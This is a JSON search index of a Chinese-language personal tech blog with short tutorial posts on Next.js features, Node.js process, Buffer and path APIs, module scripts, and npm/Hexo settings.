&lt;Link href='/'&gt; &lt;a&gt;Homepage&lt;/a&gt; &lt;/Link&gt; &lt;/p&gt; &lt;/div&gt; )}","link":"/2022/09/03/next-404-page/"},{"title":"Next.js－動態路由","text":"比較不一樣的作法。 簡述很多時候我們會碰到動態路由的需求，像是某篇文章的頁面可能是 /posts/id，還是某樣產品細節頁面是 /products/id 的這種路由，這種時候就需要讓 id 這一段變成是「動態」的。 在 Next 裡面的作法是這樣： 把要動態的頁面用 [] 來命名，例如 post/[id].js 該頁面必須設置 getStaticPaths 來定義所有可能的路由 該頁面最後再透過 getStaticProps 並根據路由參數來存取對應的資料 附上官網給的貼切流程： 最後這個頁面的內容會長的像這樣： 12345678910111213141516171819202122232425262728293031323334import Layout from '../../components/layout'import { getAllPostIds, getPostData } from '../../lib/post'// 1. 取得所有的 [id] 路徑export async function getStaticPaths() { const paths = getAllPostIds() return { paths, fallback: false }}// 2. 這邊就可以存取到 [id]，並去打對應的 API 拿資料export async function getStaticProps({ params }) { const postData = getPostData(params.id) return { props: { postData } }}// 3. 最後渲染出畫面（pre-rendering）export default function Post({ postData }) { return ( &lt;Layout&gt; {postData.title} &lt;br /&gt; {postData.id} &lt;br /&gt; {postData.date} &lt;/Layout&gt; )} 附註：關於 getStaticPaths 的回傳格式 上面的範例因為有把 code 拆開來寫所以不是很清楚，getStaticPaths 的回傳值是有遵循某個格式的，不可以亂傳： 12345678const returnValue = { paths: { params: { id: data.id.toString() } }, fallback: false} 為什麼要有 getStaticPaths？這邊想做個補充，因為如果你跟我一樣原本是寫 SPA 的話可能會有點疑惑，「為什麼需要先產生 path 才行？」 首先要在強調一次：Next 是通常是基於 SSR/SSG 來產生網頁內容，所以這代表我們在 build 的時候就必須知道「有多少個頁面要產生？」 假設我們的 /post/[id] 有 10 篇文章，那 Next 就應該要在 Server 產生出 10 個 HTML： /post/1 /post/2 /post/3 ... 所以我們一定要透過某種方式來告訴 Next 這件事情，這個就是 getStaticPaths 背後的含義。 關於 fallback關於這部分可能有點小複雜，如果想知道更詳細的內容我推薦看 這篇文章，講的還蠻清楚的。這邊我只會大概說一下每種 option 的用途。 fallback: false 這個就是假設 user 到了沒有產生的頁面時，Next 會自動跳轉到 404 頁面。 fallback: true 當 user 到了沒有產生的頁面時，Next 會走這樣的流程： 開始動態產生新的內容（getStaticProps），並進入 fallback loading 的狀態（或稱為 fallback 頁面），這個狀態可以透過 router.isFallback 來取得。 HTML 生成完以後把結果秀出來 下次造訪相同頁面時，不需要再重新產生一次 fallback: block 這個就跟 true 流程差不多，唯一的差別是沒有 router.isFallback 可以存取，等於說在動態產生的這段期間是「卡住（blocking）」的，不會有 fallback 頁面存在。也許是因為這樣所以才會這樣命名吧，不過基本上最後的結果會是相同的。","link":"/2022/09/12/next-dynamic-route/"},{"title":"Next.js－fallback","text":"稍微複雜一些的機制。 簡述再解釋之前先說一下什麼時候會用到 Fallback？舉例來說，假設我們有一個這樣的網頁： 首頁是一個食譜列表，接著點進去以後可以看到詳細內容，非常的簡單，而這些資料都是串接 CMS 來產生出的靜態資料（SSG）。 那麼現在思考一個問題： 假設我在 CMS 上加了一個新食譜，那我該怎麼同步到網頁上？ 這邊會碰到的問題是「詳細頁面」的內容是透過網址上的 slug 來抓取的，所以會需要： 產生新的頁面（recipes/peanu-butter-cookie.html） 把對應的資料抓取下來 所以這部分的 code 會大概長這樣： 123456789101112131415161718192021222324252627282930// 產生路徑export async function getStaticPaths() { const response = await client.getEntries({ content_type: 'recipe' }) const paths = response.items.map((recipes) =&gt; ({ params: { slug: recipes.fields.slug } })) return { paths, fallback: false }}// 根據路徑抓資料，最後再注入 propsexport async function getStaticProps({ params }) { const response = await client.getEntries({ content_type: 'recipe', 'fields.slug': params.slug }) return { props: { recipe: response.items[0] }, revalidate: 1 }} 這邊雖然有利用「Incremental Static Regeneration」來做自動更新內容，但之前有說過他只能幫你更新現有的頁面，沒辦法幫你產生新的 page。 所以假設我現在新增了一個叫「abc」的食譜，接著造訪的話只會得到 404 的結果，因為這是一個全新的 page（recipes/abc.html），而 Incremental Static Regeneration 不會幫我產生新的 page。 所以要更新的話就是把整個專案重新 build 以後在重新 deploy 一次。因為是重新產生所有資料，因此內容就會更新。 這樣確實是一種方式。但有沒有更好的作法？像是自動幫我抓取新資料，接著產生對應的頁面？ 有，就是本篇的標題 fallback，他就是用來做這件事的。 使用 Fallback眼尖的話應該能注意到剛剛的範例中其實就有出現 fallback，不過值是 false： 123456789101112131415// 產生路徑export async function getStaticPaths() { const response = await client.getEntries({ content_type: 'recipe' }) const paths = response.items.map((recipes) =&gt; ({ params: { slug: recipes.fields.slug } })) return { paths, fallback: false // 在這裡 }} 設為 false 的行為就是跳轉到 404 頁面，意思是當我們造訪不存在的頁面（例如：recipe/abc）時，因為找不到對應頁面所以就直接導向 404 頁面。 重點來了，現在我們希望他能「自動抓取新資料 &amp; 產生頁面」的功能，因此要把他設為 true。 設為 true 的話當我們在造訪 recipe/abc 時，他會做下面幾件事： 進入 Fallback Page（通常會做一個 Loading 效果） 重新執行 getStaticProps，抓取 abc 的食譜資料 把回傳結果傳入 props，把 recipes/abc 的頁面渲染出來給使用者 自動在 Server 產生新的 recipes/abc.html，下次就不需要在跑這個流程 附註：如果在第三步抓資料這一段出問題的話，可以做重新導向的動作。 所以我們只要這樣子改寫就好： 123456789101112131415161718192021222324252627282930313233343536373839export async function getStaticPaths() { // ...略 return { paths, fallback: true // 打開 fallback 功能 }}export async function getStaticProps({ params }) { const response = await getData() // 如果抓資料出問題的話，直接導向首頁 if (!response.items.length) { return { redirect: { destination: '/', permanent: false } } } return { props: { recipe: response.items[0] }, revalidate: 1 }}export default function RecipeDetails({ recipe }) { // 進入 fallback 頁面 if (!recipe) { return &lt;Skeleton /&gt; } const { title, cookingTime, featureImage, ingredients, method } = recipe.fields return &lt;div&gt;{/*...*/}&lt;/div&gt;} 這樣子就完成啦，我覺得還蠻划算的，只需要簡單加個幾行就能實現。","link":"/2022/09/15/next-fallback/"},{"title":"Next.js－獲取資料（getStaticProps）","text":"很重要很重要的東西。 簡述一個網站通常都會有「抓資料」這個流程，在 React 的世界裡我們通常會用 useEffect 的方式來做： 12345678910111213141516171819202122export default function Index() { const [data, setData] = useState([]) useEffect(() =&gt; { fetch('https://jsonplaceholder.typicode.com/users') .then((response) =&gt; response.json()) .then((data) =&gt; setData(data)) }, []) return ( &lt;div&gt; &lt;h1&gt;All Ninjas&lt;/h1&gt; {data.map((item) =&gt; ( &lt;div key={item.id}&gt; &lt;a className={styles.single}&gt; &lt;h2&gt;{item.name}&lt;/h2&gt; &lt;/a&gt; &lt;/div&gt; ))} &lt;/div&gt; )} 這樣子做雖然好像可行，但要注意這樣就變成 CSR 而不是 SSR 了，換句話說就是失去原本的意義了，因為打開原始碼你還是會看到「空蕩蕩的內容」，而不是被渲染後的結果。 所以要讓「抓資料」這件事在 Server 端就完成並且渲染的話，要改用 Next 提供的 getStaticProps，這是其中一種，還有另外一種方式叫做 getServerSideProps，詳細可以參考這篇文章。 1234567891011121314151617181920212223242526// export 一個 getStaticProps 給 Next 做處理（必須是 async 函式）export const getStaticProps = async () =&gt; { const response = await fetch('https://jsonplaceholder.typicode.com/users') const ninjas = await response.json() return { props: { ninjas } }}export default function Index(props) { return ( &lt;div&gt; &lt;h1&gt;All Ninjas&lt;/h1&gt; {props.ninjas.map((ninja) =&gt; ( &lt;div key={ninja.id}&gt; &lt;a className={styles.single}&gt; &lt;h2&gt;{ninja.name}&lt;/h2&gt; &lt;/a&gt; &lt;/div&gt; ))} &lt;/div&gt; )} 背後的原理其實就是告訴 Next 在做 pre-rendering 時先去執行 getStaticProps，接著在把回傳值當作 props 傳給對應的 page 元件，因此 page 只要根據 props 來渲染出內容就行了。 關於 Pre-rendering（SSG / SSR）剛剛的範例用的是 SSG（Static Side Generation），不過除此之外 Next 還提供了另一種方法是 SSR（Server Side Rendering），這兩者的共通點是「Pre-rendering」，就是畫面都會在 Server 端先渲染完成。 主要的差別在於 Pre-rendering 的「時機點」，SSG 是在 build 時產生，SSR 則是在收到 request 時產生，參考這張圖： 附註：如果用 PHP 邏輯來解釋的話 SSG 就像是一開始就先把編譯後的結果存起來，等有 request 時再直接送出去；而 SSR 則是收到 request 時才做編譯。 至於哪一種方式比較好還是要看情況，SSG 比較適合用在內容不太會變動的（畢竟都叫 Static 了），而 SSR 則適合用在內容會常常更新的內容（需要 Server 頻繁的產生新的 HTML），總之要視情境來選擇。","link":"/2022/09/10/next-get-static-props/"},{"title":"Next.js－使用圖片","text":"藏了蠻多小細節。 簡述很簡單，只要把對應的圖片丟到 /public 底下後在存取就行了： 1234567891011121314151617181920import Link from 'next/link'export default function Navbar() { return ( &lt;nav&gt; &lt;h1 className='logo'&gt; &lt;img src='/logo.png' /&gt; &lt;/h1&gt; &lt;Link href='/'&gt; &lt;a&gt;Home&lt;/a&gt; &lt;/Link&gt; &lt;Link href='/about'&gt; &lt;a&gt;About&lt;/a&gt; &lt;/Link&gt; &lt;Link href='/ninjas'&gt; &lt;a&gt;Ninja Listing&lt;/a&gt; &lt;/Link&gt; &lt;/nav&gt; )} 不過比起用 &lt;img&gt; Next 會更推薦你用內建的 &lt;Image&gt; 元件來處理： 123456789101112131415161718192021import Image from 'next/image'import Link from 'next/link'export default function Navbar() { return ( &lt;nav&gt; &lt;h1 className='logo'&gt; &lt;Image src='/logo.png' alt='ninjas' width={128} height={77} /&gt; &lt;/h1&gt; &lt;Link href='/'&gt; &lt;a&gt;Home&lt;/a&gt; &lt;/Link&gt; &lt;Link href='/about'&gt; &lt;a&gt;About&lt;/a&gt; &lt;/Link&gt; &lt;Link href='/ninjas'&gt; &lt;a&gt;Ninja Listing&lt;/a&gt; &lt;/Link&gt; &lt;/nav&gt; )} 要注意使用 &lt;Image&gt; 一定要提供寬跟高，next 會自動幫你處理 RWD 的問題，除此以外還會自動幫你做「Lazy Loading」的功能，算是一個很棒的功能。 載入外部圖片當你透過「網址」來引入外部圖片時，可能會看到這個錯誤訊息： 簡單來說這是 Next 為了避免 XSS 攻擊而使用的一種措施，你必須列出一份「白名單」來告訴 Next「我信任哪些 Domain 下的資源？」 所以要加上這段 config 設定： 123456// next.config.jsmodule.exports = { images: { domains: ['assets.example.com'] }} 更多詳細可以參考官方文件的說明。 layout（props）在 Image 中有一個 layout props 可以用來調整圖片的尺寸，詳細可以參考官方文件，這邊簡單說明一下用途。 預設值是intrinsic，就是依照 width 和 height 的尺寸來設置圖片，不過在做 RWD 的時候就會碰到這個問題： 這邊圖片的 width 和 height 的值設為 200，所以他就只會是這個尺寸，不會隨著容器來做縮放。 這時候就可以改成 responsive，讓他自動填滿容器的寬，達到 RWD 的效果： 我覺得這應該是會很常用的一個值，所以可以記起來。至於其他的選項可以到我寫的 範例 自己玩玩看。","link":"/2022/09/06/next-image/"},{"title":"Next.js－Incremental Static Regeneration","text":"在學 Next 的人都一定會學到它。 簡述簡單來說這是一個 Next 提供一種「讓你能夠動態更新內容」的功能。這裡先強烈推薦這部影片，看完你大概就理解為什麼需要這個功能了。 舉個例子，一般來說我們用 SSG 打包後部署後的網站，只要我們沒有重新做「build 」這個動作的話，內容就會維持在「上一次 build 出來的內容」。應該很合理吧？畢竟 SSG 的本質就只是在 build 時產生內容，接著再放到 Server 上而已。 可是這樣做有一個問題，有時候我們可能只是改動一個小地方而已，就要重新做 build &amp; deploy 似乎有點太重工了，尤其是當專案很大的時候可能又會花費更多時間來處理。 因此 Incremental Static Regeneration 就是用來解決這件事的，他會做下面這幾件事： 幫你檢查目前這個頁面的內容是否有更新？ 如果有，Next 會在自動在背後重新抓取內容（正確來說是重跑一次 getStaticProps）。 重新整理後 or 下個進來人，就能看到新的內容 這邊要注意的地方是重新整理後才會看到更新後的內容，並不會即時反應在畫面上。 另外一個要注意的地方是只會更新目前現有的頁面，舉例來說我原本有這些頁面： home.html about.html 並且這兩個頁面都設定了 Incremental Static Regeneration，所以當這兩個頁面的內容改變時就會被重新產生，很合理。 But，如果現在我新增了一個 contact.html，那我的網頁上是不會多出這個頁面的，這個不在的 Incremental Static Regeneration 範圍，一定要等到我整個專案重新 build，或者是利用 fallback 頁面來處裡才會更新，這個就留到下一篇再來解釋了。 總之要一定搞清楚「更新的實際範圍」是哪裡？這樣就行了。 使用方式使用的方式很簡單，只要在那個頁面的 getStaticProps 新增一個 revalidate 回傳值就行了： 1234567891011121314export async function getStaticProps({ params }) { const response = await client.getEntries({ content_type: 'recipe', 'fields.slug': params.slug }) return { props: { recipe: response.items }, // 每 10 秒檢查一次 revalidate: 10 }} 解釋一下 revalidate 的含義，這個「每 10 秒檢查」的意思是： 當有人造訪這個頁面 而且距離上次更新已經超過 10 秒 才會觸發檢查的動作，並不是在背後每隔十秒就檢查並且更新的意思。","link":"/2022/09/14/next-incremental-static-regeneration/"},{"title":"Next.js－出現在所有頁面的元件（Layout）","text":"簡稱根元素 簡述有些內容通常會出現在「每一個頁面」中，這時候要怎麼處理比較妥當？你第一個會想到的可能是寫成獨立的 Component。 But，另一個問題來了，假使有 100 個頁面都會用到的話，是不是就得在所有頁面都插入這個 Component，像這樣： 1234567891011121314export default function About() { return ( &lt;div&gt; {/* 插入寫好的 component */} &lt;Navbar /&gt; &lt;h1&gt;about&lt;/h1&gt; &lt;p&gt; Lorem, ipsum dolor sit amet consectetur adipisicing elit. Incidunt, ab culpa accusantium quo iure aperiam impedit ducimus eum sit earum illum, est fuga alias soluta suscipit tempore esse nulla dolorem! &lt;/p&gt; &lt;/div&gt; )} 思考一下如果哪天我想把 &lt;Navbar&gt; 換位置？或者是又有新的 Component 要添加的話，我是不是就得一個一個去改或新增？雖然是可行，但是太麻煩了，所以其實有更好的作法。 首先注意到 pages/_app.js 這隻檔案： 1234567import '../styles/globals.css'function MyApp({ Component, pageProps }) { return &lt;Component {...pageProps} /&gt;}export default MyApp 這支檔案的內容其實就是整個頁面的「結構」，換句話說放在這裡的東西都會被當作是頁面的一部分，比如說我加了一個「標題」： 123456789101112import '../styles/globals.css'function MyApp({ Component, pageProps }) { return ( &lt;div&gt; &lt;h1&gt;Global Title&lt;/h1&gt; &lt;Component {...pageProps} /&gt; &lt;/div&gt; )}export default MyApp 那現在不論是哪個頁面都會看到 Global Title 這段文字。 所以常見的 &lt;Navbar&gt; 或是 &lt;Footer&gt; 都可以放在這邊。不過比起直接放進去，更好的作法是抽成 Component 搭配 children 來使用，像這樣： 1234567891011// components/Layout.jsimport Navbar from './Navbar'export default function Layout({ children }) { return ( &lt;div&gt; &lt;Navbar /&gt; {children} &lt;/div&gt; )} 123456789101112// _app.jsimport Layout from '../components/Layout'function MyApp({ Component, pageProps }) { return ( &lt;Layout&gt; &lt;Component {...pageProps} /&gt; &lt;/Layout&gt; )}export default MyApp 把 children 寫成 props 的形式就可以讓 code 看起來更簡潔一些，也可以把邏輯封裝在元件自身上。","link":"/2022/09/02/next-layout-component/"},{"title":"Next.js－Link","text":"又來帶你環遊世界。 簡述在 Next 中要做「跳轉」這個動作一樣要透過它提供的 Link 元件來實作，像這樣： 1234567891011121314151617import Link from 'next/link'export default function Navbar() { return ( &lt;div&gt; &lt;Link href='/'&gt; &lt;a&gt;Home&lt;/a&gt; &lt;/Link&gt; &lt;Link href='/about'&gt; &lt;a&gt;About&lt;/a&gt; &lt;/Link&gt; &lt;Link href='/list'&gt; &lt;a&gt;List&lt;/a&gt; &lt;/Link&gt; &lt;/div&gt; )} 附註： Next.js 12.2 以前才需要把 &lt;a&gt; 包在 &lt;Link&gt; 中 雖然一樣有用到 &lt;a&gt;，可是注意 href 是寫在 &lt;Link&gt; 身上。 &lt;Link&gt; 的用意是 Next 會在背後幫你用很像「SPA」的方式來換頁，不過一樣會做 SSR。 這邊來看一張圖： 這邊可以注意到幾件事： 沒有重新整理（這一點很像 SPA，技術上稱為 「client-side navigation」） 原始碼可以看到更新後的內容（證明這是 SSR） about.js 是在我們到「那個頁面」時才去發 request 取得的（技術上會稱為 Code splitting） 所以這就是用 &lt;Link&gt; 的好處，還有他背後幫你做的事情，這些是單純用 &lt;a&gt; 做不到的，所以我們才需要他。","link":"/2022/09/01/next-link/"},{"title":"Next.js－meta 標籤","text":"雖然目前還不常用到它，不過還是瞭解一下比較好。 簡述既然都用 next 了，那麼 meta 標籤就變成是蠻重要的一個部分。這邊可以透過 next 內建的 &lt;Head&gt; 來處理： 1234567891011121314import Head from 'next/head'export default function about() { return ( &lt;&gt; &lt;Head&gt; &lt;title&gt;PeaNu | About&lt;/title&gt; &lt;/Head&gt; &lt;div&gt; &lt;h1&gt;About&lt;/h1&gt; &lt;p&gt;...&lt;/p&gt; &lt;/&gt; )} 這樣子當我在 /about 這個頁面時就會出現 &lt;title&gt;。","link":"/2022/09/09/next-meta-tag/"},{"title":"Next.js－重新導向（router）","text":"很熟悉的東西。 簡述Next 中也有提供 router 的功能，非常有 React 的味道： 1234567891011121314151617181920212223242526import Link from 'next/link'import { useRouter } from 'next/router'import React, { useEffect } from 'react'export default function NotFound() { const router = useRouter() useEffect(() =&gt; { setTimeout(() =&gt; { router.push('/') }, 2000) }, []) return ( &lt;div className='not-found'&gt; &lt;h1&gt;Ooops...&lt;/h1&gt; &lt;h2&gt;That page cannot be found :(&lt;/h2&gt; &lt;p&gt; Go back to the{' '} &lt;Link href='/'&gt; &lt;a&gt;Homepage&lt;/a&gt; &lt;/Link&gt; &lt;/p&gt; &lt;/div&gt; )}","link":"/2022/09/04/next-redirect/"},{"title":"Next.js－Router Hooks","text":"到了 SSR 以後就會需要用到它。 簡述在 SSR 的世界裡面實作「Loading」效果的方式跟 CSR 不太一樣。 想想看在 CSR 中你是怎麼做的？沒意外的話應該是這樣吧： 12345678910111213141516171819202122function SomePage() { const [loading, setLoading] = useState(true) useEffect(() =&gt; { fetch(...) .then((response) =&gt; response.json()) .then((data) =&gt; { console.log('data', data) setLoading(false) }) .catch((error) =&gt; { console.log('error', error.message) setLoading(false) }) }, []) return loading ? ( &lt;div&gt;Loading...&lt;/div&gt; ) : ( &lt;div&gt;Lorem ipsum&lt;/div&gt; )} 邏輯就是把一開始 fetch 拿資料做初始化的這段時間設為 loading 效果，等拿到結果後在更新 state。 But 在 SSR 裡面不會有 fetch 這件事，因為資料在 Server 端時就會渲染完了，所以等到元件渲染時資料早就已經處理完畢了，沒有機會讓你顯示 Loading 的狀態。 不過 Server 在渲染的這段期間確實是需要等待的，只是要換種方式來實作，其中一種方式就是透過「路由事件」來判定。 useRouter 除了提供基本路由操作以外，還有以下事件可以用： routeChangeStart 路由開始跳轉時觸發 routeChangeComplete 路由結束跳轉時觸發 routeChangeError 路由跳轉發生錯誤時觸發 beforeHistoryChange 歷史紀錄改變時觸發 hashChangeStart “#” 後的路徑開始改變時觸發 hashChangeComplete “#” 後的路徑開始改變時觸發 詳細介紹可以參考 官方文件，不過最常用的基本上是 routeChangeStart 和 routeChangeComplete。 有了這個 event 後要實作 loading 就很輕鬆了，只要在 Layout 的部分根據事件來做出反應就行了： 1234567891011121314151617181920212223242526272829303132333435363738394041424344import Link from 'next/link'import { useRouter } from 'next/router'import { useEffect, useState } from 'react'export default function Layout({ children }) { const router = useRouter() const [loading, setLoading] = useState(false) useEffect(() =&gt; { function onRouteChangeStart() { console.log('routeChangeStart') setLoading(true) } function onRouteChangeComplete() { console.log('routeChangeComplete') setLoading(false) } function onRouteChangeError() { console.log('onRouteChangeError') alert('Ooops! something goes wrong.') setLoading(false) } router.events.on('routeChangeStart', onRouteChangeStart) router.events.on('routeChangeComplete', onRouteChangeComplete) router.events.on('routeChangeError', onRouteChangeError) // 以這個例子來說這邊不需要清除 Effect，不過還是養成好習慣比較好。 return () =&gt; { console.log('clear handler') router.events.off('routeChangeStart', onRouteChangeStart) router.events.off('routeChangeComplete', onRouteChangeComplete) router.events.off('routeChangeError', onRouteChangeError) } }, []) return ( &lt;div className='layout'&gt; &lt;div className='page-content'&gt;{loading ? &lt;div&gt;Loading...&lt;/div&gt; : children}&lt;/div&gt; &lt;/div&gt; )}","link":"/2022/09/05/next-router-hooks/"},{"title":"Next.js－架構","text":"一開始就有 React 的感覺 簡述以往我們用 React 做出來的專案通常都是「SPA（Single Page Application）」，不過到了 Next 就不一樣了，會變成「MPA（Multiple Page Application）」。 兩個最大的差別在於「SSR」和「CSR」，簡單來說就是一個是在 Server 端先渲染好以後在回傳 Response，另一個則是先回傳 Respnose 後再從 Client 端渲染。因此 S 和 R 的就是代表「Server」與「Client」的意思。 資料夾結構首先用 create-next-app 建立好的專案會長這樣： 123456789101112131415├── README.md├── next.config.js├── package.json├── pages│&nbsp;&nbsp; ├── _app.js│&nbsp;&nbsp; ├── api│&nbsp;&nbsp; │&nbsp;&nbsp; └── hello.js│&nbsp;&nbsp; └── index.js├── public│&nbsp;&nbsp; ├── favicon.ico│&nbsp;&nbsp; └── vercel.svg├── styles│&nbsp;&nbsp; ├── Home.module.css│&nbsp;&nbsp; └── globals.css└── yarn.lock 基本上都跟 CRA（create-react-app）差不多，不過有幾個地方不同： 沒有 src，變成 pages 了 public 中不會再有 index.html 前面有說過 Next 是一套 SSR 框架，代表我們所有的東西都「必須在 Server 端就處理好」，所以不會再跟 CSR 一樣先產生一個空殼（index.html）再做渲染。 取而代之的是 pages 這個資料夾，Next 會自動依據裡面的「檔案名稱」來產生對應的「Route」。例如說我新增了 about.js，那就會多出 /about 這個網址，index.js 也是一樣的道理，只是一般 index 就代表根目錄，所以網址會是 / 而不是 /index。 總之基本的 next 架構就長這樣，接著會一篇一篇解釋其他的相關功能。","link":"/2022/08/31/next-setup/"},{"title":"在 Node 指令中帶入參數","text":"好用的 API。 ProcessNode 裡面有提供一個 Process 的模組，其中 process.argv 這個屬性可以存取你在用 node 指令時所帶入的參數： 假設我執行 node index.js 1： 12const process = require('process')console.log(process.argv) 輸出結果會得到一個陣列： 1[ 'D:\\\\Program\\\\Node.js\\\\node.exe', 'D:\\\\test_folder\\\\index.js', '1' ] 應該很熟這個格式吧？ node 指令的執行檔案 index.js 的執行檔案位置 帶入的字串 1 相信熟知 JavaScript 的你就知道接下來該怎麼做了。 一個串接 API 的示範簡單拿 reqres 這個 API 來做示範： 12345678const request = require('request') // 引入下載的 request 模組 const { argv } = require('process') // 把 argv 解構出來// users 後面接的是 IDrequest( `https://reqres.in/api/users/${argv[2]}`, (error, response, body) =&gt; console.log(JSON.parse(body))) 接著執行 node index.js 1： 12345678910111213{ data: { id: 1, email: 'george.bluth@reqres.in', first_name: 'George', last_name: 'Bluth', avatar: 'https://reqres.in/img/faces/1-image.jpg' }, support: { url: 'https://reqres.in/#support-heading', text: 'To keep ReqRes free, contributions towards server costs are appreciated!' }} 就順利完成囉！","link":"/2022/01/03/node-argument/"},{"title":"Node 中的 buffer 模組","text":"方便進行編碼處理。 簡述簡單來說，Buffer 是一種「二進位的資料格式」。 JavaScript 裡面沒有內建的這種資料型態，所以 Node.js 中引入了 Buffer 模組來讓 JavaScript 可以處理二進位的資料。 詳細可以參考 官方文件 把文字轉換成 base64使用 Buffer.from('string', 'decode')，前面是原字串，後面是用什麼編碼來讀取字串： 備註：不引入其實也沒關係，因為在 Node.js 中 Buffer 是全域變數 1234// 利用解構引入 Buffer.Bufferconst { Buffer } = require('buffer')const encodeToBase64 = Buffer.from('abc', 'utf8').toString('base64') console.log(encodeToBase64) // YWJj 應用在 http base authentication12345678// YWRtaW46YWRtaW4xMjMconst credentials = Buffer.from('admin:admin123').toString('base64') request({ url: 'http://example.com/api', headers: { 'Authorization': 'Basic YWRtaW46YWRtaW4xMjM=' }})","link":"/2022/01/10/node-buffer-module/"},{"title":"Node 指定檔案路徑","text":"記一下。 簡述在某些環境下會限制路徑必須是絕對路徑，例如 webpack.config.js 的 output。但這樣很不方便，所以可以透過 Node.js 提供的 path 來做設定。 假設我希望輸出路徑是 test_folder/output，可以這樣寫： 123const path = require('path');// 輸出路徑： D:\\test_folder\\outputconsole.log('輸出路徑：', path.resolve(__dirname, './output')); __dirname 代表目前的根路徑（test_folder），後面就是要拚接上去的路徑。","link":"/2022/02/21/node-path/"},{"title":"Node.js 中的 path 相關方法","text":"就是個懶人包 簡述很多設定檔案都會用到跟 path 有關的方法，所以我想寫一篇記下來。 這邊會假設我目前的路徑為 D:\\test_folder，並且用 D:\\test_folder\\index.js 來執行。 __dirname 目前所在的路徑（不包含檔案） 1console.log(__dirname); // D:\\test_folder __filename 目前所在的路徑（包含檔案） 1console.log(__filename); // D:\\test_folder\\index.js path.join 其實就是拚路徑遊戲 12// D:\\test_folder\\ + 'public' + 'index.js' console.log(path.join(__dirname, 'public', 'index.js')); path.resolve 直接從根目錄往下拼接（不管 index.js 放在哪個資料夾） 12// D:\\test_folder\\config\\database.jsonconsole.log(path.resolve('config', 'database.json')) path.basename(pathName) 根據傳入路徑，截出最尾端的部分 12console.log(path.basename(__dirname)); // test_folder console.log(path.basename(__filename)); // index.js","link":"/2022/04/02/nodejs-path-api/"},{"title":"<script> 有沒有 module 屬性的差別","text":"也是偶然學到記一下。 簡述本來是好奇這兩個有什麼差異： 123456&lt;!-- 用 src 引入 --&gt;&lt;script src=\"myModule\"&gt;&lt;/script&gt;&lt;!-- 用 ES6 module 引入 --&gt;&lt;script type=\"module\"&gt; import { module } from './myModule';&lt;/script&gt; 但碰巧看到這篇 文章 學到蠻多我不知道的細節，所以才寫這篇。 另外這兩個最主要的差異應該是 scope，等一下會解釋差在哪。 module 的作用域只在 &lt;script&gt; 中沒辦法在其他 &lt;script&gt; 中存取 module 裡的變數或函式： 123456789&lt;script type=\"module\"&gt; function add(a, b) { return a + b; }&lt;/script&gt;&lt;script&gt; // Uncaught ReferenceError: add is not defined console.log(add(10, 10));&lt;/script&gt; 強調一下是「只有設定 type=module 的 JS」才有 &lt;script&gt; 作用域，所以以下例子是 OK 的： 12345678&lt;script&gt; function add(a, b) { return a + b; }&lt;/script&gt;&lt;script type=\"module\"&gt; console.log(add(10, 10)); // 20&lt;/script&gt; module 中的內容會以嚴格模式來執行12345&lt;script type=\"module\"&gt; console.log(this); // undefined a = 100; // 沒有用 var 來宣告 console.log(a) // Uncaught ReferenceError: a is not defined&lt;/script&gt; 一般的 &lt;script&gt;： 12345&lt;script&gt; console.log(this); // window a = 100; // 沒有用 var 來宣告 console.log(a) // 100&lt;/script&gt; 只有 module 才可以用 ES6 模組12345&lt;script type=\"module\"&gt; // 引入寫好的模組 import { multiple } from './getElement.js'; console.log(multiple(10, 5)) // 50&lt;/script&gt; 一般的 &lt;script&gt;： 12345&lt;script&gt; // Uncaught SyntaxError: Cannot use import statement outside a module import { multiple } from './getElement.js'; console.log(multiple(10, 5))&lt;/script&gt; module 預設就有 defer 效果不知道 defer 的效果參考這篇：認識 &lt;script&gt; 中的 async 與 defer 屬性 123456&lt;script type=\"module\"&gt; // &lt;button&gt;yo&lt;/button&gt; console.log(document.querySelector('button'));&lt;/script&gt;&lt;button&gt;yo&lt;/button&gt; 一般的 &lt;script&gt;： 123456&lt;script&gt; // null console.log(document.querySelector('button'));&lt;/script&gt;&lt;button&gt;yo&lt;/button&gt; module 可以設定 async 屬性，然後一樣寫 inline script因為一般 &lt;script&gt; 的 async 僅限於用 src 請求資源的情況，不能寫 inline script，但 module 打破了這個限制： 1234567&lt;script type=\"module\" async&gt; import { multiple } from './getElement.js'; // inline script console.log(multiple(10, 5)); // 50&lt;/script&gt;&lt;button&gt;button&lt;/button&gt;","link":"/2022/02/12/normal-script-and-module-script-difference/"},{"title":"NPM 的圖片資料夾設定","text":"關於 NPM 的一個設定。 其實正確來說這個設定是用來設定一篇文章的 asset 資料夾（功能）要開還是關，但這個資料夾大多數我都拿來放圖片，所以就把他當作是圖片的資料夾設定吧。 首先，在 hexo 的根目錄下可以找到「_config.yml」檔案，這裡面有一個設定是： 1post_asset_folder: false false = 建立新文章的時候，使用 asset 功能，建立文章時自動建立一個同名的 asset 資料夾true = 建立新文章的時候，不使用 asset 功能，建立文章時不會建立 asset 資料夾 asset 資料夾就是用來放這篇文章可能會用到的圖片、影片之類的東西。 其實只是建立一個資料夾，然後名稱設成跟文章檔案的名稱相同就會自動對應到了。所以你也可以不用管這個設定，自己有需要的時候再建立也是 OK。 樓上唬爛，正確的作法是如果你要使用 asset 資料夾的功能，在建立文章之前記得要先把這個設定打開，這樣子才有辦法使用這個功能。 參考資料Hexo 圖片路徑","link":"/2021/12/11/npm-asset-folder-setting/"},{"title":"修改 npm 安裝位置（Global）","text":"隨手記一下。 簡述會碰到這問題是因為當初在安裝某些套件時碰到了「權限（EACCES）」的問題。 本來依照 官方文件 的說法是說「你可以修改 npm global 的安裝位置」，這樣子就可以避免掉這個問題了，不過試完後其實結果還是一樣不行 XD，不確定是不是因為我的 node 是用 nvm 來安裝的關係。 總之最後是直接去改系統權限才解決這問題。不過既然發現了這東西就順手記錄一下吧，說不定哪天會用到。 步驟1. 設定 npm 的安裝位置 1npm config set prefix &lt;directory_name&gt; 2. 隨便安裝一個 global 的包來測試 1npm install -g jshint 3. 檢查已安裝的套件 1npm list -g --depth=0 執行這邊的時候其實就會顯示對應的資料夾了，所以你可以在這邊順便看看是否正確。","link":"/2022/07/07/npm-change-default-storage/"},{"title":"npm global 的安裝位置","text":"只是突然想到記一下。 就是這麼簡短全域安裝的位置都會放在這裡（以我的電腦來看的話）： 1C:\\Users\\user\\AppData\\Roaming\\npm\\node_modules","link":"/2022/02/28/npm-global-path/"},{"title":"npm 小知識","text":"簡單紀錄。 關於 npm init 這個指令這個指令會幫你建立兩個檔案，package.json 跟 package-lock.json。主要是用來讓人家看這份專案有「依賴哪些套件」： 123456789101112131415{ \"name\": \"test_folder\", \"version\": \"1.0.0\", \"description\": \"\", \"main\": \"index.js\", \"dependencies\": { 